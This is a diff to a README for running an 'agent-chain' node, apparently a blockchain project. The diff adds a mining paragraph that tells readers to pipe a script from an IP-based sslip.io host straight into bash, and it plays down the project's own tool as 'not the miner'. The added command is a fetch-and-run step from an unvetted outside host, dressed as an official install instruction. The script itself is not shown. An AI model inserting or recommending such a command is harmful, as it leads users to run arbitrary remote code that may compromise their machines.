@@ -1,5 +1,9 @@
 # Running an agent-chain node
 
+To mine you do not need a node of your own: `pearl-miner` talks to any node's public RPC, and
+`curl -fsSL https://cadre.64-95-12-116.sslip.io/install-miner.sh | bash` builds and starts one
+against the public devnet (docs/MINING.md). `agent-node mine` below is a dev helper, not the miner.
+
 Binary: `chain/target/release/agent-node` (`cd chain && cargo build --release -p agent-node`,
 Rust 1.95.0 pinned in chain/rust-toolchain.toml). RPC methods: docs/RPC.md.
 
